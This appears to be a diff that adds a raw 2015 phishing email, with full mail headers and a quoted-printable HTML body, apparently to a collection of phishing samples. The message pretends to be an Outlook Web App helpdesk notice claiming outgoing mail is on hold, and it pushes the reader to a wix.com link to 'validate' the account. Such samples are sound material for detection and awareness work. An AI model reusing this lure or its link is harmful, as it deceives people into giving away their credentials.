@@ -1,0 +1,100 @@
+Return-Path: may.sandnes@bodo.kommune.no
+Delivered-To: jose@monkey.org
+X-FDA: 70842101358.04.death06_3ce5da573344c
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 18,1.407,0,fa2ce6ece0068dbc,d41d8cd98f00b204,may.sandnes@bodo.kommune.no,:in@owa.ca,RULES_HIT:10:41:72:355:375:379:582:589:962:967:973:978:983:988:989:1152:1158:1189:1208:1224:1260:1261:1263:1311:1313:1314:1345:1381:1431:1436:1437:1513:1515:1516:1517:1521:1534:1542:1567:1588:1589:1592:1593:1594:1711:1714:1730:1747:1777:1792:2393:2525:2527:2560:2563:2682:2685:2828:2859:2890:2895:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3865:3867:3868:3870:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4552:5007:6117:6261:6650:6688:8603:8885:8957:9025:9388:9908:10004:10346:11656:11658:11914:12043:12517:12519:12555:12660:12661:12955:12958:12967:13139:13141:13163:13229:13230:14093:21080:30001:30022:30054:30069:30070:30090:30091,0,RBL:91.208.24.130:@bodo.kommune.no:.lbl8.mailshell.net-62.8.176.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:70,L
+X-HE-Tag: death06_3ce5da573344c
+X-Filterd-Recvd-Size: 4525
+Received: from mail.bodo.kommune.no (mail.bodo.kommune.no [91.208.24.130])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 11 Nov 2015 11:30:18 +0000 (UTC)
+Received: from mail.bodo.kommune.no (unknown [127.0.0.1])
+	by IMSVA (Postfix) with ESMTP id 5DC9AF6D46;
+	Wed, 11 Nov 2015 12:30:15 +0100 (CET)
+Received: from BKEXCH01.bkad.local (unknown [10.0.0.39])
+	by mail.bodo.kommune.no (Postfix) with ESMTPS id 0C507F6D3F;
+	Wed, 11 Nov 2015 12:30:15 +0100 (CET)
+Received: from BKEXCH03.bkad.local ([fe80::ed52:1ecd:dcad:e6a8]) by
+ BKEXCH01.bkad.local ([fe80::5efe:10.0.0.39%11]) with mapi id 14.03.0266.001;
+ Wed, 11 Nov 2015 12:30:16 +0100
+From: May Sandnes <May.Sandnes@bodo.kommune.no>
+To: "in@owa.ca" <in@owa.ca>
+Subject: Mailbox Warning!!!
+Thread-Topic: Mailbox Warning!!!
+Thread-Index: AdEcdFYabgBkMnEGRNWjQUQJdcNGfg==
+Date: Wed, 11 Nov 2015 11:30:15 +0000
+Message-ID: <2FDD4A4BE78EBF409413703B1E741672A2009C3A@BKEXCH03.bkad.local>
+Accept-Language: nb-NO, en-US
+Content-Language: nb-NO
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+x-originating-ip: [41.71.217.47]
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+X-TM-AS-MML: disable
+X-TM-AS-Product-Ver: IMSVA-8.5.0.1165-8.0.0.1202-21150.006
+X-TM-AS-Result: No-4.424-5.0-31-10
+X-imss-scan-details: No-4.424-5.0-31-10
+X-TM-AS-User-Approved-Sender: No
+X-TM-AS-Result-Xfilter: Match text exemption rules:No
+X-TMASE-Version: IMSVA-8.5.0.1165-8.0.1202-21150.006
+X-TMASE-Result: 10-4.424300-5.000000
+X-TMASE-MatchedRID: EwyeYOSrR27DoOLYtcT3jUrRZP/NcCCSeM1fe+XnZClWgKXdMAUhnZJT
+	zjwz+Gzof14J/RG1Alu6kMgL3jbYOofsPVs/8Vw6pRezBf/GshIu7K3kCTZ3O+Ydoej3RrSBLcN
+	hwPctC/k08llWm5zjSuv8QGaI25e3IFUpwffOI4i67Q3uPo9KI/iRBkp+393QF/UJf+Pnd47qR0
+	ztm0W62K2HRIS8LpzUQWQl+jDHVJMNgFUqZt55AzPolapMwp0IURnQJHKZHKF9UD3J6sJxYKVf4
+	euuY2X8j2hRzH1UwuATNCcUsR4xSdbkrsq6X+UeTBz7dtun3oN6MOADVPuGsE8azEqN3ZTzEE4p
+	P52P373G13bJPzyiy/1FIAUNYW6kQeVMjgie/mFrShcnyFZfGi8eoW76W5iBGl6mIUUTtKauNcn
+	KEuBoj1/S0uSdmvSKjP0fM5bvLiIO3DTxFR4gg/qy+VVvqH2X
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 245
+
+<html dir=3D"ltr">
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<style type=3D"text/css" id=3D"owaParaStyle"></style>
+</head>
+<body fpstyle=3D"1" ocsi=3D"0">
+<div style=3D"direction: ltr;font-family: Tahoma;color: #000000;font-size: =
+10pt;">
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+Your two (2) outgoing mails have been placed on hold due to the recent upgr=
+ade in our database.</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+&nbsp;</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+You are required to immediately validate and re-set your Email account spac=
+e on our database:</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+<span style=3D"line-height: 21.3px;">Kindly click&nbsp;<a href=3D"http://li=
+nkclick24.wix.com/outlook-app">Only here</a>&nbsp;</span><span style=3D"lin=
+e-height: 21.3px;">to update your Outlook &nbsp;Email Account.</span></div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+&nbsp; &nbsp; &nbsp;&nbsp;</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+We apologize for any inconvenience and do appreciate your corporation &nbsp=
+;an understanding.</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
+<div style=3D"font-family: Calibri, sans-serif; line-height: 21.3px; color:=
+ rgb(68, 68, 68); font-size: 15px; background-color: rgb(255, 255, 255);">
+OWA Helpdesk ISQ=A92015 Outlook Web App Team.</div>
+</div>
+</body>
+</html>
